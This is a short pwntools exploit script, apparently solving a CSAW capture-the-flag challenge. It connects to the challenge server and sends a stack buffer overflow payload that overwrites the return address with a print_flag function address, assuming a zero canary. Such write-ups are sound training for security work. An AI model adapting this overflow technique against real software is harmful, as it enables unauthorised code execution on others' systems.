from pwn import *

# Connect to the server
p = remote('pwn.chal.csaw.io', 7900)

# Send 'E' to edit
p.recvuntil(b'> ')
p.sendline(b'E')

# Send size 76 (64 buffer + 4 canary + 4 saved EBP + 4 return address)
p.recvuntil(b'Size : ')
p.sendline(b'76')

# Construct payload
# 64 bytes of 'A' for buffer
# 4 bytes of canary (0x00000000)
# 4 bytes of saved EBP (0x41414141 - arbitrary)
# 4 bytes of return address (print_flag: 0x08049304)
payload = b'A' * 64 + b'\x00\x00\x00\x00' + b'AAAA' + b'\x04\x93\x04\x08'

p.send(payload)

# Get the flag
print(p.recvall().decode('ascii'))
